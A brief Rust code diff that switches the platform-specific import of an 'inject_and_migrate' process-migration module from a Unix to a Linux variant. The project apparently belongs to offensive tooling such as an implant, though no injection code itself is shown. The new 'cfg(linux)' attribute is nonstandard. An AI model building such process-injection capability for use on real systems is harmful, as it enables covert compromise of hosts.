@@ -2,10 +2,10 @@
 mod config;
 
 // Load the appropriate operating system's implementation
-#[cfg(unix)]
-mod rco_process_migration_unix;
-#[cfg(unix)]
-use rco_process_migration_unix::inject_and_migrate;
+#[cfg(linux)]
+mod rco_process_migration_linux;
+#[cfg(linux)]
+use rco_process_migration_linux::inject_and_migrate;
 
 #[cfg(windows)]
 mod rco_process_migration_windows;
